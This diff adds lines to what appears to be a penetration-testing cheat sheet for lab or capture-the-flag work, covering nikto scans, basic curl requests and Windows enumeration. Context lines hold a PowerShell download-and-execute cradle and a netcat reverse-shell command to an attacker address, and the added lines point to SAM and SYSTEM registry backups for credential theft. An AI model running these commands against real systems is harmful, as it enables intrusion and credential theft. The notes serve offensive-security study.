@@ -19,7 +19,14 @@ Shell Shock:
 
 Nikto
 	- nikto -host http://10.10.10.15
-		- If webdav is enabled: davtest -url http://10.10.10.15 -move -cleanup		
+		- If webdav is enabled: davtest -url http://10.10.10.15 -move -cleanup	
+	- nikto -host http://192.168.47.56 -port 8089 -nossl
+	
+Curl: 
+	- Regular curl: curl <URL>
+	- Specify a request: curl -X POST <URL>
+	- Specify a length: curl -d "" -X POST <URL>
+	
 Ping TTL time meaning: 
 	- 127: windows 
 	- 64: Linux
@@ -395,6 +402,16 @@ Password Protected SSH Private Key:
 			- IEX(New-Object Net.WebClient).downloadString('http://10.10.14.9/PowerUp.ps1')
 			- Invoke-AllChecks
 			- If applicable: Invoke-ServiceAbuse -ServiceName 'UsoSvc' -Command "C:\Windows\Temp\nc64.exe 10.10.14.9 1234 -e cmd.exe"
+			
+	General Enum Notes: 
+		- OS: systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type" 
+		- Juicy Potato: whoami /priv
+		- netstat –nao
+		- Password Location:
+					dir C:\Windows\System32\config\RegBack\SAM
+					dir C:\Windows\System32\config\RegBack\SYSTEM
+
+	
 		
 
 		
